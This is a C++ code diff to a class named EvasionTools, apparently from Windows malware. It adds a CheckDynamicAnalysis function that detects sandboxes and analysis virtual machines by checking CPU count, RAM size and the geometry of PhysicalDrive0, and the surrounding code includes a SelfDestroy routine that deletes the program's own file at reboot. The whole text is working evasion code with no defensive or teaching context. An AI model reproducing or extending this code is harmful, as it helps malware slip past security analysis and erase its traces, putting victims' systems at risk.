@@ -2,7 +2,7 @@ class EvasionTools{
 	private:
 		HANDLE fh;
 		char* tmp	=	NULL;
-
+		int 		RiskOfDetection=0;
 	public:
 		static void ChangePID(int _s=0){
 			return;
@@ -35,6 +35,28 @@ class EvasionTools{
 		int SelfDestroy(){
 			MoveFileEx(Current.name, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
 			    return 0;
+		}
+		int CheckDynamicAnalysis(){
+
+			SYSTEM_INFO CStat;
+			MEMORYSTATUSEX MStat;
+			HANDLE		DStat;
+			GetSystemInfo(&CStat);
+			MStat.dwLength = sizeof(MStat);
+			GlobalMemoryStatusEx(&MStat);
+			HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+			DISK_GEOMETRY pDiskGeometry;
+			DWORD bytesReturned;
+			DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
+			DWORD diskSizeGB;
+			diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
+
+			RiskOfDetection = 0;
+			if ( CStat.dwNumberOfProcessors < 2 )       RiskOfDetection++;
+			if ( (MStat.ullTotalPhys/1024/1024) < 2048) RiskOfDetection++;
+			if ( diskSizeGB < 100 )                     RiskOfDetection++;
+
+			return RiskOfDetection;
 		}
 };
 
